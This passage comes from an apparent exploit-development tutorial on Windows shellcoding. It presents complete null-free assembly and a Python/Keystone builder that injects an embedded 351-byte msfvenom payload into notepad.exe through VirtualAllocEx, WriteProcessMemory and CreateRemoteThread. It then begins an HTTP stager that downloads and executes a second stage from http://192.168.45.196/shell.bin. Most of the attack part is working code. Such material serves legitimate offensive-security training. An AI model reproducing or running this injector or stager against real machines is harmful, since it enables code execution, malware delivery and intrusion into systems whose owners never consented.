*OpenProcess returns a handle to notepad.exe with full access rights. The 0x001F0FFF constant is built with shl to stay null-free.*

> `PROCESS_ALL_ACCESS` is `0x001F0FFF`. We build it with `shl` and `mov cx` to avoid null bytes.

### Step 6: VirtualAllocEx

We allocate executable memory inside the target process:

```nasm
call_VirtualAllocEx:
    mov   [ebp+0x44], eax        ; save hProcess
    xor   ecx, ecx
    mov   cx, 0x015f              ; payload size (351 bytes)
    xor   eax, eax
    xor   ebx, ebx
    mov   bl, 0x40                ; PAGE_EXECUTE_READWRITE
    xor   edx, edx
    mov   dl, 0x10
    shl   edx, 0x08              ; MEM_COMMIT = 0x1000
    push  ebx                     ; flProtect = PAGE_EXECUTE_READWRITE
    push  edx                     ; flAllocationType = MEM_COMMIT
    push  ecx                     ; dwSize = 351
    push  eax                     ; lpAddress = NULL
    push  dword ptr [ebp+0x44]  ; hProcess
    call  dword ptr [ebp+0x34]   ; VirtualAllocEx(hProc, NULL, 351, 0x1000, 0x40)
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1507" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1507"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1507" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1507" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1507)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1507)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1507)" font-weight="bold">VirtualAllocEx Remote Memory Allocation</text>

  <rect x="50" y="50" width="320" height="100" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="72" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Building Constants (Null-Free)</text>
  <text x="70" y="92" fill="#e0e7ff" font-size="10">mov cx, 0x015f         → dwSize = 351 bytes</text>
  <text x="70" y="110" fill="#e0e7ff" font-size="10">mov bl, 0x40           → PAGE_EXECUTE_READWRITE</text>
  <text x="70" y="128" fill="#e0e7ff" font-size="10">mov dl, 0x10; shl 8    → MEM_COMMIT (0x1000)</text>
  <text x="70" y="143" fill="#8b949e" font-size="9">Each built without null bytes in the opcode</text>

  <line x1="370" y1="100" x2="400" y2="100" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1507)"/>

  <rect x="405" y="45" width="300" height="110" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="555" y="68" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">VirtualAllocEx Call</text>
  <text x="425" y="90" fill="#e0e7ff" font-size="9">push 0x40      → flProtect (RWX)</text>
  <text x="425" y="106" fill="#e0e7ff" font-size="9">push 0x1000    → flAllocationType (COMMIT)</text>
  <text x="425" y="122" fill="#e0e7ff" font-size="9">push 351       → dwSize</text>
  <text x="425" y="138" fill="#e0e7ff" font-size="9">push NULL      → lpAddress (OS chooses)</text>
  <text x="425" y="150" fill="#e0e7ff" font-size="9">push [ebp+0x44] → hProcess</text>

  <rect x="50" y="175" width="655" height="85" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="198" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Memory Layout After Allocation</text>
  <rect x="80" y="210" width="200" height="35" rx="4" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="180" y="232" text-anchor="middle" fill="#8b949e" font-size="10">Our shellcode process</text>
  <line x1="280" y1="228" x2="420" y2="228" stroke="#ff3366" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arr_s1507)"/>
  <text x="350" y="220" text-anchor="middle" fill="#ff3366" font-size="9">remote alloc</text>
  <rect x="425" y="210" width="250" height="35" rx="4" fill="#0d1117" stroke="#00ff88" stroke-width="2"/>
  <text x="550" y="225" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">notepad.exe → 351 bytes RWX</text>
  <text x="550" y="240" text-anchor="middle" fill="#8b949e" font-size="9">EAX = remote address → saved [ebp+0x48]</text>
</svg></div>

*VirtualAllocEx carves out 351 bytes of executable memory inside notepad.exe's address space. The returned pointer is where we'll write our payload.*

### Step 7: WriteProcessMemory

The payload address is obtained via a `call/pop` trick -- calling forward past the embedded payload bytes, then popping the return address to get a pointer to the payload:

```nasm
    mov   [ebp+0x48], eax        ; save remote allocation address
    jmp   call_payload            ; jump to end (past the payload bytes)

got_payload:
    pop   esi                     ; ESI = address of embedded payload

do_write:
    xor   eax, eax
    push  eax                     ; lpNumberOfBytesWritten = NULL
    xor   ecx, ecx
    mov   cx, 0x015f              ; nSize = 351
    push  ecx                     ; nSize
    push  esi                     ; lpBuffer = &payload
    push  dword ptr [ebp+0x48]  ; lpBaseAddress = remote alloc
    push  dword ptr [ebp+0x44]  ; hProcess
    call  dword ptr [ebp+0x38]   ; WriteProcessMemory(hProc, remote, payload, 351, NULL)
```

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1508" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1508"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1508" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1508" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s1508)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1508)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1508)" font-weight="bold">WriteProcessMemory The call/pop Payload Trick</text>

  <rect x="50" y="50" width="310" height="105" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="205" y="72" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Locating the Embedded Payload</text>
  <text x="70" y="94" fill="#e0e7ff" font-size="10">jmp call_payload</text>
  <text x="70" y="110" fill="#8b949e" font-size="9">  ↓ jumps past the payload bytes</text>
  <text x="70" y="128" fill="#e0e7ff" font-size="10">got_payload: pop esi</text>
  <text x="70" y="144" fill="#8b949e" font-size="9">  ↓ ESI = address of payload bytes</text>

  <line x1="360" y1="100" x2="390" y2="100" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1508)"/>

  <rect x="395" y="50" width="310" height="105" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="550" y="72" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">call_payload / pop Technique</text>
  <text x="415" y="92" fill="#e0e7ff" font-size="9">call_payload:</text>
  <text x="415" y="108" fill="#e0e7ff" font-size="9">  call got_payload  → pushes EIP</text>
  <text x="415" y="124" fill="#e0e7ff" font-size="9">  ; [351 payload bytes here]</text>
  <text x="415" y="140" fill="#8b949e" font-size="9">pop gets address of next byte = payload</text>

  <rect x="50" y="175" width="655" height="85" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="198" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">WriteProcessMemory(hProc, remote, &payload, 351, NULL)</text>
  <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="10">push NULL          → lpNumberOfBytesWritten</text>
  <text x="375" y="234" text-anchor="middle" fill="#e0e7ff" font-size="10">push 351           → nSize (payload length)</text>
  <text x="375" y="250" text-anchor="middle" fill="#e0e7ff" font-size="10">push ESI           → lpBuffer (payload address from pop)</text>
</svg></div>

*The jmp/call/pop trick obtains the payload's runtime address without hardcoding it. WriteProcessMemory then copies the 351-byte payload into the allocated remote buffer.*

### Step 8: CreateRemoteThread

Finally, we create a thread in the remote process that starts executing at our injected payload:

```nasm
call_CreateRemoteThread:
    xor   eax, eax
    push  eax                     ; lpThreadId = NULL
    push  eax                     ; dwCreationFlags = 0
    push  eax                     ; lpParameter = NULL
    push  dword ptr [ebp+0x48]  ; lpStartAddress = remote alloc
    push  eax                     ; dwStackSize = 0
    push  eax                     ; lpThreadAttributes = NULL
    push  dword ptr [ebp+0x44]  ; hProcess
    call  dword ptr [ebp+0x3C]   ; CreateRemoteThread

call_ExitProcess:
    xor   eax, eax
    push  eax
    call  dword ptr [ebp+0x20]   ; ExitProcess(0)
```

### Complete Process Injection Flow

<div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1502" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1502"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1502" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s1502" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="260" rx="10" fill="url(#bg_s1502)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1502)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s1502)" font-weight="bold">Process Injection Pipeline</text>

  <!-- Row 1: Discovery -->
  <text x="50" y="55" fill="#00d4ff" font-size="10" font-weight="bold">DISCOVERY</text>
  <rect x="50" y="62" width="130" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="115" y="78" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Snapshot</text>
  <text x="115" y="92" text-anchor="middle" fill="#e0e7ff" font-size="8">Toolhelp32(SNAP)</text>
  <line x1="180" y1="82" x2="200" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1502)"/>
  <rect x="205" y="62" width="130" height="40" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="270" y="78" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="bold">Enumerate</text>
  <text x="270" y="92" text-anchor="middle" fill="#e0e7ff" font-size="8">P32First → P32Next</text>
  <line x1="335" y1="82" x2="355" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1502)"/>
  <rect x="360" y="62" width="130" height="40" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="425" y="78" text-anchor="middle" fill="#ff6b35" font-size="9" font-weight="bold">Match "notepad.exe"</text>
  <text x="425" y="92" text-anchor="middle" fill="#e0e7ff" font-size="8">3 DWORD compare</text>
  <line x1="490" y1="82" x2="510" y2="82" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1502)"/>
  <rect x="515" y="62" width="130" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="580" y="78" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">OpenProcess</text>
  <text x="580" y="92" text-anchor="middle" fill="#e0e7ff" font-size="8">ALL_ACCESS</text>

  <!-- Row 2: Injection -->
  <text x="50" y="130" fill="#ff3366" font-size="10" font-weight="bold">INJECTION</text>
  <rect x="50" y="137" width="180" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="140" y="153" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">VirtualAllocEx</text>
  <text x="140" y="167" text-anchor="middle" fill="#e0e7ff" font-size="8">RWX memory in target</text>
  <line x1="230" y1="157" x2="250" y2="157" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1502)"/>
  <rect x="255" y="137" width="180" height="40" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="345" y="153" text-anchor="middle" fill="#ff3366" font-size="9" font-weight="bold">WriteProcessMemory</text>
  <text x="345" y="167" text-anchor="middle" fill="#e0e7ff" font-size="8">copy 351-byte payload</text>
  <line x1="435" y1="157" x2="455" y2="157" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s1502)"/>
  <rect x="460" y="137" width="180" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="550" y="153" text-anchor="middle" fill="#00ff88" font-size="9" font-weight="bold">CreateRemoteThread</text>
  <text x="550" y="167" text-anchor="middle" fill="#e0e7ff" font-size="8">execute in notepad.exe</text>

  <!-- Explanation -->
  <rect x="50" y="197" width="650" height="50" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,3"/>
  <text x="375" y="218" text-anchor="middle" fill="#e0e7ff" font-size="12" font-weight="bold">Payload runs inside notepad.exe's process space</text>
  <text x="375" y="238" text-anchor="middle" fill="#8b949e" font-size="10">The injector exits. The payload's thread lives on inside the target process.</text>
</svg></div>

*Figure 15.2 -- Process injection pipeline. The shellcode discovers notepad.exe, opens it with full access, allocates RWX memory, copies the payload, and creates a remote thread to execute it.*

### Full Shellcode Source (`processinjector.py`)

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "
    "   mov   ebp, esp                  ;"
    "   add   esp, 0xfffff9f0           ;"  #   Avoid NULL bytes

    " find_kernel32:                     "
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0x0C]            ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  #   ESI = PEB->Ldr.InInitOrder

    " next_module:                       "
    "   mov   ebx, [esi+0x08]           ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+0x20]           ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   modulename[12] == 0x00?
    "   jne   next_module               ;"

    " find_function_shorten:             "
    "   jmp find_function_shorten_bnc   ;"

    " find_function_ret:                 "
    "   pop esi                         ;"
    "   mov   [ebp+0x04], esi           ;"
    "   jmp resolve_symbols_kernel32    ;"

    " find_function_shorten_bnc:         "
    "   call find_function_ret          ;"

    " find_function:                     "
    "   pushad                          ;"
    "   mov   eax, [ebx+0x3c]           ;"
    "   mov   edi, [ebx+eax+0x78]       ;"
    "   add   edi, ebx                  ;"
    "   mov   ecx, [edi+0x18]           ;"
    "   mov   eax, [edi+0x20]           ;"
    "   add   eax, ebx                  ;"
    "   mov   [ebp-4], eax              ;"

    " find_function_loop:                "
    "   jecxz find_function_finished    ;"
    "   dec   ecx                       ;"
    "   mov   eax, [ebp-4]              ;"
    "   mov   esi, [eax+ecx*4]          ;"
    "   add   esi, ebx                  ;"

    " compute_hash:                      "
    "   xor   eax, eax                  ;"
    "   cdq                             ;"
    "   cld                             ;"

    " compute_hash_again:                "
    "   lodsb                           ;"
    "   test  al, al                    ;"
    "   jz    compute_hash_finished     ;"
    "   ror   edx, 0x0d                 ;"
    "   add   edx, eax                  ;"
    "   jmp   compute_hash_again        ;"

    " compute_hash_finished:             "

    " find_function_compare:             "
    "   cmp   edx, [esp+0x24]           ;"
    "   jnz   find_function_loop        ;"
    "   mov   edx, [edi+0x24]           ;"
    "   add   edx, ebx                  ;"
    "   mov   cx,  [edx+2*ecx]          ;"
    "   mov   edx, [edi+0x1c]           ;"
    "   add   edx, ebx                  ;"
    "   mov   eax, [edx+4*ecx]          ;"
    "   add   eax, ebx                  ;"
    "   mov   [esp+0x1c], eax           ;"

    " find_function_finished:            "
    "   popad                           ;"
    "   ret                             ;"

    " resolve_symbols_kernel32:          "
    "   push  0x78b5b983                ;"  #   TerminateProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x18], eax           ;"
    "   push  0xec0e4e8e                ;"  #   LoadLibraryA
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x1C], eax           ;"
    "   push  0x73e2d87e                ;"  #   ExitProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x20], eax           ;"
    "   push  0xe454dfed                ;"  #   CreateToolhelp32Snapshot
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x24], eax           ;"
    "   push  0x3249baa7                ;"  #   Process32First
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x28], eax           ;"
    "   push  0x4776654a                ;"  #   Process32Next
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x2C], eax           ;"
    "   push  0xefe297c0                ;"  #   OpenProcess
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x30], eax           ;"
    "   push  0x6e1a959c                ;"  #   VirtualAllocEx
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x34], eax           ;"
    "   push  0xd83d6aa1                ;"  #   WriteProcessMemory
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x38], eax           ;"
    "   push  0x72bd9cdd                ;"  #   CreateRemoteThread
    "   call dword ptr [ebp+0x04]       ;"
    "   mov   [ebp+0x3C], eax           ;"

    " call_CreateToolhelp32Snapshot:     "
    "   xor  eax, eax                   ;"
    "   xor  edx, edx                   ;"
    "   inc  edx                        ;"
    "   inc  edx                        ;"  #   EDX = 2 (TH32CS_SNAPPROCESS)
    "   push eax                        ;"  #   th32ProcessID = 0
    "   push edx                        ;"  #   dwFlags = 2
    "   call dword ptr [ebp+0x24]       ;"  #   CreateToolhelp32Snapshot

    " call_Process32First:               "
    "   mov  [ebp+0x40], eax            ;"  #   save hSnapshot
    "   xor  ecx, ecx                   ;"
    "   mov  cx, 0x0128                 ;"  #   sizeof(PROCESSENTRY32) = 296
    "   sub  esp, ecx                   ;"
    "   mov  edi, esp                   ;"
    "   mov  dword ptr [edi], ecx       ;"  #   pe.dwSize = 296
    "   push edi                        ;"
    "   push dword ptr [ebp+0x40]       ;"
    "   call dword ptr [ebp+0x28]       ;"  #   Process32First

    " find_process:                      "
    "   cmp  dword ptr [edi+0x24], 0x65746f6e ;"  #   "note"
    "   jne  next_process               ;"
    "   cmp  dword ptr [edi+0x28], 0x2e646170 ;"  #   "pad."
    "   jne  next_process               ;"
    "   xor  eax, eax                   ;"
    "   mov  al, 0x65                   ;"
    "   shl  eax, 0x08                  ;"
    "   mov  al, 0x78                   ;"
    "   shl  eax, 0x08                  ;"
    "   mov  al, 0x65                   ;"  #   EAX = "exe\0"
    "   cmp  dword ptr [edi+0x2c], eax  ;"
    "   jne  next_process               ;"
    "   jmp  found_explorer             ;"

    " next_process:                      "
    "   push edi                        ;"
    "   push dword ptr [ebp+0x40]       ;"
    "   call dword ptr [ebp+0x2C]       ;"  #   Process32Next
    "   jmp  find_process               ;"

    " found_explorer:                    "
    "   mov  eax, dword ptr [edi+0x08]  ;"  #   pe.th32ProcessID

    " call_OpenProcess:                  "
    "   xor  ecx, ecx                   ;"
    "   mov  cl, 0x1F                   ;"
    "   shl  ecx, 0x10                  ;"
    "   mov  cx, 0x0FFF                 ;"  #   PROCESS_ALL_ACCESS
    "   xor  ebx, ebx                   ;"
    "   push eax                        ;"  #   dwProcessId
    "   push ebx                        ;"  #   bInheritHandle = FALSE
    "   push ecx                        ;"  #   dwDesiredAccess
    "   call dword ptr [ebp+0x30]       ;"  #   OpenProcess

    " call_VirtualAllocEx:               "
    "   mov  [ebp+0x44], eax            ;"  #   save hProcess
    "   xor  ecx, ecx                   ;"
    "   mov  cx, 0x015f                 ;"  #   payload size = 351
    "   xor  eax, eax                   ;"
    "   xor  ebx, ebx                   ;"
    "   mov  bl, 0x40                   ;"  #   PAGE_EXECUTE_READWRITE
    "   xor  edx, edx                   ;"
    "   mov  dl, 0x10                   ;"
    "   shl  edx, 0x08                  ;"  #   MEM_COMMIT = 0x1000
    "   push ebx                        ;"
    "   push edx                        ;"
    "   push ecx                        ;"
    "   push eax                        ;"  #   lpAddress = NULL
    "   push dword ptr [ebp+0x44]       ;"
    "   call dword ptr [ebp+0x34]       ;"  #   VirtualAllocEx

    " call_WriteProcessMemory:           "
    "   mov  [ebp+0x48], eax            ;"  #   save remote address
    "   jmp  call_payload               ;"  #   jump past payload bytes
    " got_payload:                       "
    "   pop  esi                        ;"  #   ESI = &payload
    " do_write:                          "
    "   xor  eax, eax                   ;"
    "   push eax                        ;"  #   lpNumberOfBytesWritten = NULL
    "   xor  ecx, ecx                   ;"
    "   mov  cx, 0x015f                 ;"  #   nSize = 351
    "   push ecx                        ;"
    "   push esi                        ;"  #   lpBuffer = &payload
    "   push dword ptr [ebp+0x48]       ;"  #   lpBaseAddress
    "   push dword ptr [ebp+0x44]       ;"  #   hProcess
    "   call dword ptr [ebp+0x38]       ;"  #   WriteProcessMemory

    " call_CreateRemoteThread:           "
    "   xor  eax, eax                   ;"
    "   push eax                        ;"  #   lpThreadId = NULL
    "   push eax                        ;"  #   dwCreationFlags = 0
    "   push eax                        ;"  #   lpParameter = NULL
    "   push dword ptr [ebp+0x48]       ;"  #   lpStartAddress
    "   push eax                        ;"  #   dwStackSize = 0
    "   push eax                        ;"  #   lpThreadAttributes = NULL
    "   push dword ptr [ebp+0x44]       ;"  #   hProcess
    "   call dword ptr [ebp+0x3c]       ;"  #   CreateRemoteThread

    " call_ExitProcess:                  "
    "   xor  eax, eax                   ;"
    "   push eax                        ;"
    "   call dword ptr [ebp+0x20]       ;"  #   ExitProcess(0)

    " call_payload:                      "
    "   call got_payload                ;"  #   push &payload
    # Embedded second-stage payload (351 bytes)
    # This is a msfvenom-generated payload that executes
    # inside the target process's address space
    "   .byte 0xd9,0xc4,0xbf,0x81,0xac,0xaa,0x74,0xd9,0x74,0x24 ;"
    "   .byte 0xf4,0x5a,0x2b,0xc9,0xb1,0x52,0x31,0x7a,0x17,0x03 ;"
    "   .byte 0x7a,0x17,0x83,0x43,0xa8,0x48,0x81,0xbf,0x59,0x0e ;"
    "   .byte 0x6a,0x3f,0x9a,0x6f,0xe2,0xda,0xab,0xaf,0x90,0xaf ;"
    "   .byte 0x9c,0x1f,0xd2,0xfd,0x10,0xeb,0xb6,0x15,0xa2,0x99 ;"
    "   .byte 0x1e,0x1a,0x03,0x17,0x79,0x15,0x94,0x04,0xb9,0x34 ;"
    "   .byte 0x16,0x57,0xee,0x96,0x27,0x98,0xe3,0xd7,0x60,0xc5 ;"
    "   .byte 0x0e,0x85,0x39,0x81,0xbd,0x39,0x4d,0xdf,0x7d,0xb2 ;"
    "   .byte 0x1d,0xf1,0x05,0x27,0xd5,0xf0,0x24,0xf6,0x6d,0xab ;"
    "   .byte 0xe6,0xf9,0xa2,0xc7,0xae,0xe1,0xa7,0xe2,0x79,0x9a ;"
    "   .byte 0x1c,0x98,0x7b,0x4a,0x6d,0x61,0xd7,0xb3,0x41,0x90 ;"
    "   .byte 0x29,0xf4,0x66,0x4b,0x5c,0x0c,0x95,0xf6,0x67,0xcb ;"
    "   .byte 0xe7,0x2c,0xed,0xcf,0x40,0xa6,0x55,0x2b,0x70,0x6b ;"
    "   .byte 0x03,0xb8,0x7e,0xc0,0x47,0xe6,0x62,0xd7,0x84,0x9d ;"
    "   .byte 0x9f,0x5c,0x2b,0x71,0x16,0x26,0x08,0x55,0x72,0xfc ;"
    "   .byte 0x31,0xcc,0xde,0x53,0x4d,0x0e,0x81,0x0c,0xeb,0x45 ;"
    "   .byte 0x2c,0x58,0x86,0x04,0x39,0xad,0xab,0xb6,0xb9,0xb9 ;"
    "   .byte 0xbc,0xc5,0x8b,0x66,0x17,0x41,0xa0,0xef,0xb1,0x96 ;"
    "   .byte 0xc7,0xc5,0x06,0x08,0x36,0xe6,0x76,0x01,0xfd,0xb2 ;"
    "   .byte 0x26,0x39,0xd4,0xba,0xac,0xb9,0xd9,0x6e,0x62,0xe9 ;"
    "   .byte 0x75,0xc1,0xc3,0x59,0x36,0xb1,0xab,0xb3,0xb9,0xee ;"
    "   .byte 0xcc,0xbc,0x13,0x87,0x67,0x47,0xf4,0x68,0xdf,0x46 ;"
    "   .byte 0x01,0x01,0x22,0x48,0x08,0x6a,0xab,0xae,0x60,0x9c ;"
    "   .byte 0xfa,0x79,0x1d,0x05,0xa7,0xf1,0xbc,0xca,0x7d,0x7c ;"
    "   .byte 0xfe,0x41,0x72,0x81,0xb1,0xa1,0xff,0x91,0x26,0x42 ;"
    "   .byte 0x4a,0xcb,0xe1,0x5d,0x60,0x63,0x6d,0xcf,0xef,0x73 ;"
    "   .byte 0xf8,0xec,0xa7,0x24,0xad,0xc3,0xb1,0xa0,0x43,0x7d ;"
    "   .byte 0x68,0xd6,0x99,0x1b,0x53,0x52,0x46,0xd8,0x5a,0x5b ;"
    "   .byte 0x0b,0x64,0x79,0x4b,0xd5,0x65,0xc5,0x3f,0x89,0x33 ;"
    "   .byte 0x93,0xe9,0x6f,0xea,0x55,0x43,0x26,0x41,0x3c,0x03 ;"
    "   .byte 0xbf,0xa9,0xff,0x55,0xc0,0xe7,0x89,0xb9,0x71,0x5e ;"
    "   .byte 0xcc,0xc6,0xbe,0x36,0xd8,0xbf,0xa2,0xa6,0x27,0x6a ;"
    "   .byte 0x67,0xeb,0xbc,0x0b,0xf0,0x9c,0x9a,0xa6,0xbc,0xc0 ;"
    "   .byte 0x1c,0x1d,0x82,0xfc,0x9e,0x97,0x7b,0xfb,0xbf,0xd2 ;"
    "   .byte 0x7e,0x47,0x78,0x0f,0xf3,0xd8,0xed,0x2f,0xa0,0xd9 ;"
    "   .byte 0x27 ;"
)

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

shellcode = bytes(encoding)
shellcode_str = ''.join(f'\\x{b:02x}' for b in shellcode)
print(f"[+] Generated Shellcode: {shellcode_str}")
print(f"[+] Shellcode length: {len(shellcode)} bytes")
```

### PoC Video

The following video demonstrates the process injection shellcode finding `notepad.exe`, injecting a payload into its address space, and executing it via a remote thread:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/process-injection-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Process injection into notepad.exe via CreateRemoteThread*

---

## 16. HTTP Stager: Downloading Second Stage

A **stager** is a minimal shellcode whose only job is to download and execute a larger payload. This keeps the initial shellcode small enough to fit tight buffer overflows, while the second-stage payload (hosted on an HTTP server) can be arbitrarily large.

This shellcode uses Windows Internet (WinINet) APIs to fetch a second-stage binary from `http://192.168.45.196/shell.bin`, allocates executable memory, reads the payload into it, and runs it in a new thread.

### Step 1: Resolving kernel32.dll Functions

Five functions from `kernel32.dll`:

| Function | Hash | Stack Offset | Purpose |
|----------|------|-------------|---------|
| TerminateProcess | `0x78b5b983` | `[ebp+0x10]` | Clean exit |
| LoadLibraryA | `0xec0e4e8e` | `[ebp+0x14]` | Load wininet.dll |
| VirtualAlloc | `0x91afca54` | `[ebp+0x18]` | Allocate RWX memory |
| CreateThread | `0xca2bd06b` | `[ebp+0x1C]` | Execute downloaded payload |
| WaitForSingleObject | `0xce05d9ad` | `[ebp+0x20]` | Wait for payload thread |

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983              ; TerminateProcess
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x10], eax
    push  0xec0e4e8e              ; LoadLibraryA
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x14], eax
    push  0x91afca54              ; VirtualAlloc
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x18], eax
    push  0xca2bd06b              ; CreateThread
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x1C], eax
    push  0xce05d9ad              ; WaitForSingleObject
    call  dword ptr [ebp+0x04]
    mov   [ebp+0x20], eax
```

<div align="center"><svg viewBox="0 0 750 240" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1604" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1604"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
